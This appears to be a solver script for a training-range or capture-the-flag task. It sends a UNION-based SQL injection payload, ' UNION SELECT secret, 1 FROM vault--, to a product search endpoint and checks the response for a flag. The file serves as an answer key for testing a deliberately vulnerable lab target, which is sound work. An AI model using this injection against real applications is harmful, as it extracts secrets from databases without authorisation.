"""Intended-path solver: UNION SELECT extraction from the two-column product query."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.get(
        f"{ctx.url()}/products",
        params={"q": "' UNION SELECT secret, 1 FROM vault--"},
        timeout=10,
    )
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="union-extract",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "product listing did not yield the flag",
            )
        ]
    )
